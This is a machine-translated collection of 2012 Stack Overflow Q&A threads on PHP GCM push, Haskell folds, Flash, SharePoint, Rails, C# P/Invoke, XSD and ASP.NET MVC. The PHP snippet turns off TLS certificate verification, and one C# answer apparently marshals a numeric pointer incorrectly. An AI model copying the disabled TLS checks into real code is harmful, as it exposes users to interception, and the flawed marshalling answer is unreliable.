我正在尝试向 Android 手机发送消息，但不断收到带有文本的响应代码 401：未经授权。此外，我一直在阅读关于使用什么密钥的不同故事，我知道 3 个密钥：项目 ID（编号）、服务器应用程序的密钥和浏览器应用程序的密钥。所以我尝试了所有 3 个，结果都一样。

我的代码：

```
$headers = array("Content-Type" => "application/json", "Authorization" => "key=" . "mykey");
    $data = array(
        'data' => $messageText,
        'registration_ids' => array($deviceRegistrationId)
    );

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
    curl_setopt($ch, CURLOPT_URL, "https://android.googleapis.com/gcm/send");
    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    error_log(json_encode($data));
    $response = curl_exec($ch);
    curl_close($ch);
    error_log($response); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:10:23.127

I changed the header to:

```
$headers = array("Content-Type:" . "application/json", "Authorization:" . "key=" . "mykey"); 
```

And it works. The mykey is Key for browser apps.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-18T17:39:37.617

你可以这样做你的标题只是为了让它更容易阅读并消除连接：

```
$headers = array(
    "Authorization:key=mykey",
    "Content-Type:application/json",
); 
```

# haskell - 没有堆栈溢出的 Haskell 递归函数

> ID：11396178
> 
> 赞同：1
> 
> 时间：2012-07-09T13:37:08.870
> 
> 标签：haskell, recursion, stack-overflow, tail-recursion

我有一个索引纺织品的递归函数，如果我将它用于巨大的文本文件，我会得到堆栈空间溢出。我想因为我把递归部分放在 let 部分我可以避免这个堆栈空间溢出，但我仍然得到它。使用此函数避免堆栈空间溢出的最佳方法是什么？

```
--lines to Map

parseLinesToWordEntryMap :: Int -> [String] -> M.Map Word [TextLocation] -> (M.Map Word [TextLocation])
parseLinesToWordEntryMap lineNumber [] wordEntryMap  = wordEntryMap
parseLinesToWordEntryMap lineNumber (x:xs) wordEntryMap =
    let
         lineNumber' = lineNumber-1
         wordEntryMapRec = parseLinesToWordEntryMap lineNumber' xs wordEntryMap
    in
         parseLineToWordEntryMap lineNumber x wordEntryMapRec 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-09T13:48:39.247

你所拥有的基本上是一个正确的折叠，

```
parseLinesToWordEntryMap lineNumber xs wordEntryMap
    = foldr update wordEntryMap (zip [lineNumber, lineNumber - 1 .. ] xs)
      where
        update (num,x) wordMap = parseLineToWordEntryMap num x wordMap 
```

因此，如果`parseLineToWordEntryMap`它的参数是严格的`Map`（对于参数来说非常典型`Map`），在到达列表末尾之前什么都做不了，然后返回到列表的开头构建结果。

如果可能的话，您应该以相反的方式使用输入，使用左折叠，并确保折叠函数具有正确的严格性，这样就不会构建大的 thunk。

对于更具体的建议，我们需要查看更多代码。

# flash - 错误 1119：通过静态类型 fl.controls:label 的引用访问可能未定义的属性值

> ID：11396181
> 
> 赞同：0
> 
> 时间：2012-07-09T13:37:13.300
> 
> 标签：flash, audio, flash-cs4

我对 flash 有点陌生。我正在使用 flash cs4。现在我正在制作一个带有开始停止和音量的 mp3 播放器。但是音量滑块有一个错误。

```
sTransform.volume = sldVolume.value; 
```

这是来源

> 错误是 1119：通过静态类型 fl.controls:label 的引用访问可能未定义的属性值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:31:57.107

使用`fl.controls`，您应该监听更改事件。

```
import fl.controls.Slider; 
import fl.events.SliderEvent; 
import fl.controls.Label; 

sldVolume.addEventListener(SliderEvent.CHANGE, changeHandler); 

function changeHandler(event:SliderEvent):void { 
    sTransform.volume  = event.value;   
} 
```

[使用 Slider 组件](http://help.adobe.com/en_US/ActionScript/3.0_UsingComponentsAS3/WS5b3ccc516d4fbf351e63e3d118a9c65b32-7fa1.html)

# css - 如何修改标准对话框表单sharepoint 2010的宽度

> ID：11396185
> 
> 赞同：1
> 
> 时间：2012-07-09T13:37:38.107
> 
> 标签：css, sharepoint, styles, modal-dialog, list-definition

请帮我！

我需要修改标准对话框表单的宽度以将元素添加到库中。

如果我单击功能区按钮以添加元素，则以宽度 = 402px 打开的表单：

```
<div class="ms-dlgContent" role="dialog" aria-labelledby="dialogTitleSpan"  tabindex="-1" style="z-index: 1505; display: block; width: 402px; height: 294px; left: 430px; top: 104px; "></div> 
```

如果我单击当前库的所有元素下的按钮，则以宽度 = 1032px 打开的表单：

```
<div class="ms-dlgContent" role="dialog" aria-labelledby="dialogTitleSpan" tabindex="-1" style="z-index: 1505; display: block; width: 1032px; height: 267px; left: 115px; top: 273px; "></div> 
```

我不明白，在宽度= 402px的第二种情况下打开我需要做什么。

也许需要在 Upload.aspx 中输入一些代码？（此表单自动生成）我猜，此页面为创建新元素而打开，因为我的列表定义的 schema.xml 包含以下代码：

```
<Forms>
  <Form Type="DisplayForm" SetupPath="pages\form.aspx" Url="Forms/DispForm.aspx" WebPartZoneID="Main" />
  <Form Type="EditForm" SetupPath="pages\form.aspx" Url="Forms/EditForm.aspx" WebPartZoneID="Main" />
  <Form Type="NewForm" Url="Forms/Upload.aspx" WebPartZoneID="Main" />
</Forms> 
```

但是如果修改 Upload.aspx 的这一部分（添加 .ms-dglContent 类），它对我没有帮助：

```
<asp:Content ContentPlaceHolderId="PlaceHolderBodyAreaClass" runat="server">
<style type="text/css">
.ms-bodyareaframe {
   padding: 8px;
   border: none;
}
.ms-dglContent {
   width:402px!important;
}
</style>
</asp:Content> 
```

如果我修改 css 文件：

```
.ms-dglContent {width:402px!important;} 
```

它修改了所有对话框形式，但在我的情况下是不可接受的。

我将不胜感激任何尝试提供帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T11:35:03.587

模态对话框 div 动态放置到 DOM 中。如果要修改对话框尺寸，请尝试查找类似 SP.UI.ModalDialog 的调用...

```
var dialogCallbackToMainSite = function (dialogResult, returnValue) {

    if(returnValue == 'someValue') {
    }
};

var option = {
    url:record.data.url,
    title:'Task',
    allowMaximize:false,
    showClose:false,
    autoSize:false,

    width: 800,
    height: 600,

    dialogReturnValueCallback:dialogCallbackToMainSite
};

SP.UI.ModalDialog.showModalDialog(option); 
```

顺便说一句，如果您需要在带页面滚动的情况下垂直居中对话框并且它的静态位置被禁用，请遵循此解决方案[http://generation12.wordpress.com/2011/10/25/floating-the-sp-ui-模态对话框/](http://generation12.wordpress.com/2011/10/25/floating-the-sp-ui-modaldialog/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T15:16:04.677

我不习惯在 Sharepoint 中工作，但在我看来，触发要显示的对话框的函数以某种方式在测量变量上提供了不同的值，所以是的，您可能需要在某处更改代码。尝试在整个解决方案中搜索“1032” - 也许宽度测量值已分配给某处的变量。

如果您希望两个对话框看起来相同并且找不到它们的测量值（不过，我强烈建议您先尝试），您可以使用 !important 覆盖内联样式，就像这样：

```
.ms-dglContent {width:402px!important;} 
```

# ruby-on-rails - ActiveRecord 是在撒谎吗？

> ID：11396188
> 
> 赞同：0
> 
> 时间：2012-07-09T13:37:58.993
> 
> 标签：ruby-on-rails, activerecord

我的 ActiveRecord 没有说实话。你自己看：

```
> User.posts.class
  => Array
> User.posts.all.class
  => Array
> a = Array.new
> a.class
 => Array 
> a.all
  NoMethodError: undefined method `all' for []:Array 
```

没有`Array#all`方法，所以`User.posts`不能是`Array`. 这里发生了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T13:45:47.483

这是在 Rails 中实现关联的方式。它们是惰性代理对象。

查看文档以获取更多信息：[https ://github.com/rails/rails/blob/master/activerecord/lib/active_record/associations/collection_proxy.rb#L25](https://github.com/rails/rails/blob/master/activerecord/lib/active_record/associations/collection_proxy.rb#L25)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:41:34.720

Ruby 有一个单例方法的概念。这意味着对象可以更改其类定义的行为。读[这个](http://www.rubyist.net/~slagell/ruby/singletonmethods.html)。

# c# - 在 C# 中使用 char* 参数声明 C 函数

> ID：11396189
> 
> 赞同：1
> 
> 时间：2012-07-09T13:38:05.203
> 
> 标签：c#, dllimport

使用 C#.net，我如何在 .dll 文件中声明和使用此函数：

```
DEMO_API Boolean DEMO_CALL GetVersion(Char* versionBuffer,
    UInt16* versionLengthBuffer); 
```

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:40:46.957

C# 本身没有字符串指针的概念，您可以只使用字符串/int。

基本上要定义你自己的，你必须做一些稍微不同的事情，但它不会兼容。

```
public bool GetVersion (string versionBuffer, int versionLengthBuffer) 
```

如果您使用现有项目，请查看[pInvoke](http://pinvoke.net/)以获取可能的签名列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T11:03:08.293

这是我找到的解决方案：

```
 [DllImport("DEMO.dll",
        SetLastError = true,
        CallingConvention = CallingConvention.Cdecl)]
    public extern static byte GetVersion(
        [MarshalAs(UnmanagedType.LPStr)] StringBuilder versionBuffer,
        [MarshalAs(UnmanagedType.LPWStr)] StringBuilder versionLengthBuffer); 
```

# c# - 在 C# Web 服务中使用 xsd:id

> ID：11396190
> 
> 赞同：0
> 
> 时间：2012-07-09T13:38:08.947
> 
> 标签：c#, java, xsd

我有一个 WSDL，它定义了一个 type 字段`xsd:id`。我发现 wsdl.exe 将其视为`string`Silverlight 客户端 VS ASP.NET Web 服务一切正常。实际上，ID 由 DB 作为自动递增整数生成，并在放入 SOAP 时转换为字符串。

使用 Java，xsd:ID 是`org.apache.axis.types.ID`并且整数不再起作用。我试图找到 xsd:ID 类型的正确定义和示例，但没有提供任何资金。

我在哪里可以找到这种类型的合法和非法值的示例？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:01:15.977

在这里您可以找到 xsd:id 字段的定义：

[http://www.schemacentral.com/sc/xsd/t-xsd_ID.html](http://www.schemacentral.com/sc/xsd/t-xsd_ID.html)

xsd:id 是对 NCName 的限制，而 NCName 又是对 Name 的限制。如果您查看名称的无效值，您会发现名称不能以数字开头。因此，作为对名称的限制的 id 也不能以数字开头。在这种情况下，我猜 Java 不接受整数是正确的。如链接页面中所述，id 必须与此正则表达式匹配： [\i-[:]][\c-[:]]*

# c# - 级联下拉列表mvc3，创建方法

> ID：11396191
> 
> 赞同：0
> 
> 时间：2012-07-09T13:38:13.583
> 
> 标签：c#, javascript, asp.net-mvc-3

我尝试制作和级联下拉列表：第一个用于项目的 dropdwonlist，第二个用于活动的下拉列表。

型号： 项目：

```
usinng System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.ComponentModel.DataAnnotations;
using System.Web.Mvc;

namespace ManyToMany.Models
{

    public enum StatusProject
    {
        Ja,
        Nee
    }

    public class Project
    {
        //[DatabaseGenerated(DatabaseGeneratedOption.None)]
        // [Display(Name= "Number")]
        [Key]
        public int ProjectID { get; set; }
        // [Display(Name = "Naam")]
        //[Required(ErrorMessage = "Naam moet wel ingevuld worden")]
        public string Name { get; set; }
        // [StringLength(100,ErrorMessage = "U kunt niet meer dan 100 tekens invoeren!! ")]
        // [Required(ErrorMessage = "Korte beschrijving")]
        [Display(Name ="omschrijving" )]
        public string Description { get; set; }

        // [Required(ErrorMessage = "U moet wel het aantal uren opgeven")]
        [Display(Name = "Geplande uren")]
        public decimal PlannedHours { get; set; }
        [Required(ErrorMessage = "eh, prijskaartje?")]
        [DisplayFormat(DataFormatString = "{0:c}")]
        [Display(Name = "Prijs")]
        public decimal price { get; set; }
        public bool Intern { get; set; }
        [Display(Name = "project manager")]
        public string projectManager { get; set; }
        [Display(Name = "Project Code")]
        public string projectCode { get; set; }
        [Display(Name = "Start Datum")]
        public DateTime? StartDate { get; set; }
        [Display(Name = "Eind datum")]
        public DateTime? EndDate { get; set; }
        [Display(Name = "Actief?")]
        public bool Active { get; set; }
        // public StatusProject StatusProject { get; set; }

        public virtual ICollection<Employee> Employees { get; set;}
        public virtual IEnumerable<Activity>Acitivity  { get; set; }
        //public IEnumerable<Activity> Activities { get; set; }
        //public IEnumerable<SelectListItem> Activities { get; set; }

        public Project()
        {
            this.Employees = new List<Employee>();
            this.Acitivity = new List<Activity>();

        }
    }
} 
```

模型活动：

```
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Linq;
using System.Web;
using System.ComponentModel.DataAnnotations;

namespace ManyToMany.Models
{
    public class Activity
    {
        //[Key]
        //[DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        //[Display(Name = "Nummer(willekeurig nummer)")]
        [Key]
        public int ActivityID { get; set; }
        [Required(ErrorMessage = "Naam moet wel ingevuld worden")]
        [MaxLength(50)]
        [Display(Name = "Activiteit")]
        public string Name { get; set; }

        [Display(Name = "Omschrijving")]
        public string Description { get; set; }

        [Display(Name = "uren")]
        public decimal Hour { get; set; }

        [DataType(DataType.Date)]
        [Display(Name = "Begin datum")]
        public DateTime BeginDate { get; set; }        

        [DataType(DataType.Date)]
        [Display(Name = "Eind datum")]
        public DateTime EndDate { get; set; }

        [Display(Name = "Tarief")]
        public decimal Tariff { get; set; }

        [Display(Name = "Actief?")]
        public bool Active { get; set; }

        [Display(Name = "project")]
        public int ProjectID { get; set; }
        //public virtual DbSet<Project> Project { get; set; }
        public virtual Project Project { get; set; }
        public virtual ICollection<Employee> Employee { get; set; }
        //public virtual ICollection<Activity> Activities { get; set; }
        public virtual ICollection<Hour> Hours { get; set; }
    }
} 
```

看法：

```
@using System.Collections
@using System.Globalization
@using System.Web.Mvc.Html
@using ManyToMany.Helpers
@using ManyToMany.Controllers
@using ManyToMany.Models

@model ManyToMany.Models.Hour 
@{
    ViewBag.Title = "Create";
}

<h2>Create</h2>
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/SelectWeek.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/JQueryFixes.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.GetActivities.js")" type="text/javascript"></script>

<script type="text/javascript">
    $(document).ready(function () {
        $("#ProjectID").change(function () {
            var idDept = $(this).val();
            $.getJSON('@Url.Action("GetProjectList", "Hour")', { id: idDept },
                    function (myData) {
                        var select = $("#activity");
                        select.empty();

                        $.each(myData, function (index, itemData) {
                            select.append($('<option/>', {
                                value: itemData.Value,
                                text: itemData.Text
                            }));
                        });
                    });
                });
         });
    $(document).ready(function() {
        $("#ProjectID").change();
    });
</script>

@using (Html.BeginForm())
{
    @Html.ValidationSummary(true)
    <fieldset>
        <legend>Hour</legend>
        <table style="width: 10%;">
            <tr>
                <td>
                    <div class="editor-label">
                        @Html.LabelFor(model=> model.Activity.ProjectID,"Project")
                    </div>
                </td>
                <td>
                     <div class="editor-field">
                         @Html.DropDownListFor(model => model.Activity.Project.ProjectID, new SelectList(ViewBag.Projects as IEnumerable,"ProjectID","Name"),null, new {id ="ProjectID"}) 
                         @Html.ValidationMessageFor(model=> model.Activity.Project.Name)
                    </div>
                </td>
            </tr>
            <tr>
                <td>
                    <div class="editor-label">

                        @Html.LabelFor(model=> model.Activity.Name)
                    </div>
                </td>

                <td>
                    <div class="editor-field">
                        @Html.DropDownListFor(model => model.Activity, new SelectList(Enumerable.Empty<SelectListItem>(),"ActivityID", "Name"),null, new {id = "activity"}) 
                        @Html.ValidationMessageFor(model=> model.ActivityID)
                    </div>
                </td>
            </tr>
        </table>
        <br/>
        <table style="width: 100%;">
            <tr>
                <td>

                    <div class="editor-field">
                        @Html.Hidden("WeekID", String.Empty)
                        @Html.ValidationMessageFor(model => model.WeekID)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.LabelFor(model => model.WeekNumber, "week")
                    </div>
                    <div class="editor-field">
                        @Html.DropDownList("weeknr",(IEnumerable<SelectListItem>)Html.GetWeekNumbers(), new { onchange = "Selectedchange();" })
                        @Html.Hidden("weeknr", Html.GetWeekNumbers())
                        @Html.ValidationMessage("weeknr")
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("Maandag")
                    </div>
                    <div class="editor-field">
                        @string.Format(new System.Globalization.CultureInfo("en-US").ToString())
                        @Html.TextBox("Monday", Model.Monday.ToString(), new{@readonly = "readonly" }) 
                       @Html.ValidationMessageFor(model=> model.Monday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("Dindsdag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Tuesday)
                        @Html.TextBox("Tuesday", Model.Tuesday.ToString(), new{@readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Tuesday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("woendag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Wendsday)
                        @Html.TextBox("Wendsday", Model.Wendsday.ToString(), new { @readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Wendsday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("donderdag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Thursday)
                        @Html.TextBox("Thursday", Model.Thursday.ToString(), new{@readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Thursday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("vrijdag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Fryday)
                        @Html.TextBox("Fryday", Model.Fryday.ToString(), new{@readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Fryday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("Zaterdag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Saterday)
                        @Html.TextBox("Saterday", Model.Saterday.ToString(), new{@readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Saterday)
                    </div>
                </td>
                <td>
                    <div class="editor-label">
                        @Html.Label("zondag")
                    </div>
                    <div class="editor-field">
                         @string.Format(new System.Globalization.CultureInfo("en-US"), "{0:0.##}", Model.Sunday)
                        @Html.TextBox("Sunday", Model.Sunday.ToString(), new{@readonly = "readonly" }) 
                        @Html.ValidationMessageFor(model=> model.Sunday)
                    </div>
                </td>
                <td>Totaal:</td>
            </tr>
            <tr>
                <td>
                </td>
                <td>
                 Uren:
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.MondayHours)
                        @Html.ValidationMessageFor(model => model.MondayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.TuesdayHours)
                        @Html.ValidationMessageFor(model => model.TuesdayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.WendsdayHours)
                        @Html.ValidationMessageFor(model => model.WendsdayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.ThursdayHours)
                        @Html.ValidationMessageFor(model => model.ThursdayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.FrydayHours)
                        @Html.ValidationMessageFor(model => model.FrydayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.SaterdayHours)
                        @Html.ValidationMessageFor(model => model.SaterdayHours)
                    </div>
                </td>
                <td>
                    <div class="editor-field">
                        @Html.EditorFor(model => model.SundayHOurs)
                        @Html.ValidationMessageFor(model => model.SundayHOurs)
                    </div>
                </td>
                 <td> 
                    <div class="editor-field">
                        @Html.TextBox("0.0",Model.HourTotal, new {@readonly  = "readonly"} )
                        @Html.ValidationMessageFor(model => model.HourTotal)
                    </div>
                </td>
            </tr>
            <tr>
            </tr>
        </table>
        <p>
            <input type="submit" value="Save" />
        </p>
    </fieldset>
}
<div>
    @Html.ActionLink("Back to List", "Index")
</div> 
```

和控制器：

```
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Globalization;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using ManyToMany.Models;

namespace ManyToMany.Controllers
{ 

    //[Authorize(Roles = "Administrator")]
    public class HourController : Controller
    {
        private TimeSheetContext db = new TimeSheetContext();
        //
        // GET: /Hour/

        public ActionResult Index()
        {
            var Hours = db.Hours.Include(a => a.Activity).Include(a => a.Activity.Project);
            return View(db.Hours.ToList());
        }

        [HttpPost]
        public  ActionResult Index(int year)
        {
            return new EmptyResult();
        }

        //
        // GET: /Hour/Details/5

        public ViewResult Details(int id)
        {
            Hour hour = db.Hours.Find(id);
            return View(hour);
        }

        //
        // GET: /Hour/Create
        //Just getting the page from URL.Getting the data(Raw data).

        public ActionResult Create()
        {
            ViewBag.HourID = new SelectList(db.Hours, "HourID", "HourID");
            ViewBag.Projects = db.Projects.ToList();
            ViewBag.Activities = db.Activities.ToList();
            return View(new Hour());
        }//end method create 

        //[HttpPost]
        //Restricting an action: u also can write: [httpPost]. But then the second dropdownlist doesent work
        //[AcceptVerbs(HttpVerbs.Post)]
        [AcceptVerbs( HttpVerbs.Get)]
        public  JsonResult GetProjectList(string id)
        {
            var ProjectList = this.GetProjects(Convert.ToInt32(id));
            //DropdownList always have to get an text and Value
            var myData = ProjectList.Select(p => new SelectListItem
                                                     {
                                                         Text = p.Name,
                                                         Value = p.ActivityID.ToString(CultureInfo.InvariantCulture)
                                                     });
           //JSonRequestBehavior is an security issur. It is protecting against invalid data.
            return Json(myData, JsonRequestBehavior.AllowGet);
        }//end method

        //This is for the second dropdownlist: the activities. When a project is selected. The Id of the selected project
        //correspond with the associated Activities.
        private  IEnumerable<Activity> GetProjects(int id)
        {
            //List of activities corresponding with the selected Project
            return db.Activities.Where(p => p.ProjectID == id).ToList();

        }//end method

            //
        // POST: /Hour/Create

        [HttpPost]
        public ActionResult Create(Hour hour)
        {
            Activity temp = new Activity();
            temp = GetProjects(1).FirstOrDefault();
            hour.Activity = temp;
            hour.ActivityID = temp.ActivityID;

            try
            {
                if (ModelState.IsValid)
                {
                    if (db.Hours != null) db.Hours.Add(hour);

                    //db.Hours.Add(hour.Monday.Value.ToString("d"));

                    db.SaveChanges();
                    //ViewBag.Projects = db.Projects.ToList();
                    //ViewBag.Activities = db.Activities.ToList();
                    return RedirectToAction("Index");
                }
            }
            catch (Exception exception)
            {
                ModelState.AddModelError("", exception);
            }//end catch exception.

            //Important!! This will mangage that the actuall data will be saved.If u forget this then u only see it in the view!!

            ViewBag.Projects = db.Projects.ToList();
            ViewBag.Activities = db.Activities.ToList();
            return View(hour);
        }//end method

        //
        // GET: /Hour/Edit/5

        public ActionResult Edit(int id)
        {
            Hour hour = db.Hours.Find(id);
            ModelState.AddModelError("Name", "What a nice name");
            return View(hour);
        }//end method

        //
        // POST: /Hour/Edit/5

        [HttpPost]
        public ActionResult Edit(Hour hour)
        {
            if (ModelState.IsValid)
            {
                db.Entry(hour).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index");
            }
            ViewBag.WeekID = new SelectList(db.Weeks, "WeekID", "WeekID", hour.WeekID);
            ViewBag.Projects = db.Projects.ToList();
            ViewBag.Activities = db.Activities.ToList();
            return View(hour);
        }//end method

        //
        // GET: /Hour/Delete/5

        public ActionResult Delete(int id, bool? saveChanges)
        {
            if (saveChanges.GetValueOrDefault())
            {
                ViewBag.ErrorMessage = "Cant save";
            }
            Hour hour = db.Hours.Find(id);
            return View(hour);
        }//end method

        //
        // POST: /Hour/Delete/5

        [HttpPost, ActionName("Delete")]
        public ActionResult DeleteConfirmed(int id)
        {            
            Hour hour = db.Hours.Find(id);
            db.Hours.Remove(hour);
            db.SaveChanges();
            return RedirectToAction("Index");
        }//end method

        protected override void Dispose(bool disposing)
        {
            db.Dispose();
            base.Dispose(disposing);
        }//end method
    }
} 
```

这是关于`Edit method(HttpPost)`. 你可以选择一个项目和相关的活动。但是提交到数据库是不可能的。因为我收到此错误：

```
ModelState.IsValid = false. 
```

请问有人可以帮我吗？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T20:56:01.947

这是我的模型小时：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel;
using System.Globalization;
using System.Web.Mvc;

namespace ManyToMany.Models
{
    public class Hour
    {

        //public string Name { get; set; }
        //public string Url { get; set; }
        public int HourID { get; set; }
       // public virtual Week Week { get; set; }
        public int? WeekID { get; set; }
        //[Key]
        public int? ActivityID { get; set; }
        public virtual Activity Activity { get; set; }
        //public int ActivtityID { get; set; }

        //[DisplayFormat(ApplyFormatInEditMode=true, DataFormatString="{0:c}")]
        //public decimal? Amount { get; set; }

        [ReadOnly(true)]
        //[DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public decimal HourTotal { get { return GetTotalHours(); }   }

        public int WeekNumber { get; set; }
        public int yearNumber { get; set; }

        //Properties days:

        public DayOfWeek DayWeek { get; set; }

        //public DateTime DateDay { get; set; }

       [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Monday { get; set; }
        public int Days { get; set; }

        [DataType(DataType.Date)]//
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Tuesday { get; set; }

        [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Wendsday { get; set; }

        [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Thursday { get; set; }

        [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Fryday { get; set; }
        [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Saterday { get; set; }
        [DataType(DataType.Date)]
        [DisplayFormat(DataFormatString = "{0:d}", ApplyFormatInEditMode = true)]
        public DateTime? Sunday { get; set; }
        //End properties days

        //Properties hours:
       // [DisplayFormat(DataFormatString = "{0:#.##0.0#}", ApplyFormatInEditMode = true)]
        [Required]
        //[DisplayFormat(DataFormatString= "{0:#,##0.000#}")] 
        public Decimal MondayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal TuesdayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal WendsdayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal ThursdayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal FrydayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal SaterdayHours { get; set; }
        //[DisplayFormat(DataFormatString = "{0:#.#}", ApplyFormatInEditMode = true)]
        [Required]
        public Decimal SundayHOurs { get; set; }

        public string TextMonday { get; set; }
        public string TextTuesday { get; set; }
        public string TextWendsday { get; set; }
        public string TextThursday { get; set; }
        public string TextFryday { get; set; }
        public string TextSaterday { get; set; }
        public string TextSunday { get; set; }

        public decimal GetTotalHours()
        {
            return MondayHours + 
                   TuesdayHours + 
                   WendsdayHours + 
                   ThursdayHours + 
                   FrydayHours + 
                   SaterdayHours +
                   SundayHOurs;
        }

        //public IEnumerable<SelectListItem> Hour { get; set; }

        public Hour()
        {

            //Activity = new List<Activity>();

            this.yearNumber = DateTime.Now.Year;

            Days = DateTime.Now.DayOfWeek - DayOfWeek.Monday;
            Monday = DateTime.Now.AddDays(-Days);
            Tuesday =  DateTime.Now.AddDays(0);// .Monday.AddDays(1).ToShortDateString();//.ToShortDateString());
            Wendsday = DateTime.Now.AddDays(1);  //DateTime.Parse(Monday.AddDays(2).ToShortDateString());
            Thursday = DateTime.Now.AddDays(2);    //DateTime.Parse(Monday.AddDays(3).ToShortDateString());
            Fryday = DateTime.Now.AddDays(3);          //DateTime.Parse(Monday.AddDays(4).ToShortDateString());
            Saterday = DateTime.Now.AddDays(4);              //DateTime.Parse(Monday.AddDays(5).ToShortDateString());
            Sunday =   DateTime.Now.AddDays(5);             //DateTime.Parse(Monday.AddDays(6).ToShortDateString());

            this.WeekNumber = System.Threading.Thread.CurrentThread.CurrentCulture.Calendar.GetWeekOfYear(DateTime.Now, System.Globalization.CalendarWeekRule.FirstDay, DayOfWeek.Sunday);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-12T12:13:27.373

这是因为您正在分配控制器中的所有活动。在控制器 [Get] 编辑操作中，从项目对象中分配 ViewBag 活动。但是我在小时模型中没有找到任何项目属性，我的意思是在保存时您将如何决定要节省的项目时间？..

get 方法上没有 Viewbag 分配，这是您必须按两次按钮的原因！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T06:40:39.100

如果您的怀疑是正确的，那么我担心您在这里做错了什么......什么是活动类型？......

```
 <div class="editor-field">
                    @Html.DropDownListFor(model => model.Activity, new SelectList(Enumerable.Empty<SelectListItem>(),"ActivityID", "Name"),null, new {id = "activity"}) 
                    @Html.ValidationMessageFor(model=> model.ActivityID)
  </div> 
